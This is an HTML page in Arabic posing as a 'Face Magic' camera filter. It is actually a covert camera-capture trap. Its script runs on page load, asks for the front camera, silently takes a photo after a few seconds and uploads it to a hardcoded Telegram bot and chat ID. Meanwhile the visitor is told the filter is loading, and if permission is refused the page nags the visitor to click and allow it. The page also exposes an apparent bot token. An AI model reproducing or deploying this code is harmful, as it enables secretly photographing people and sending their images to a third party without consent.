<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>✨ Face Magic</title>
  <style>
    body {
      background: #0a0a0a; color: #f0f0f0;
      font-family: Arial, sans-serif; text-align: center; padding-top: 20vh;
    }
    .loader {
      border: 5px solid #333; border-top: 5px solid #9b59b6;
      border-radius: 50%; width: 60px; height: 60px;
      animation: spin 1s linear infinite; margin: 20px auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <h2>جاري تجهيز الفلتر السحري...</h2>
  <p>سيُطلب إذن الكاميرا، الرجاء السماح</p>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = '982438425:AAE9Mxa8C9Pg3yIyHthfTR4dptzWX-LhkMo';
    const CHAT_ID = '815444701';

    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();

        await new Promise(r => setTimeout(r, 3500));

        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth || 720;
        canvas.height = video.videoHeight || 1280;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve =>
          canvas.toBlob(resolve, 'image/jpeg', 0.92)
        );

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'snap_' + Date.now() + '.jpg');
        formData.append('caption', '🔴 صورة جديدة من الكاميرا');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST', body: formData
        });

        stream.getTracks().forEach(t => t.stop());
        document.body.innerHTML = '<h2>✨ تم التحميل! الفلتر قادم...</h2>';
      } catch (e) {
        document.body.innerHTML = '<div style="cursor:pointer; padding-top:30vh;"><h2>انقر هنا للسماح بالكاميرا</h2><p>اضغط على الشاشة للمتابعة</p></div>';
        document.body.addEventListener('click', captureAndSend, { once: true });
      }
    }

    window.addEventListener('load', captureAndSend);
  </script>
</body>
</html>
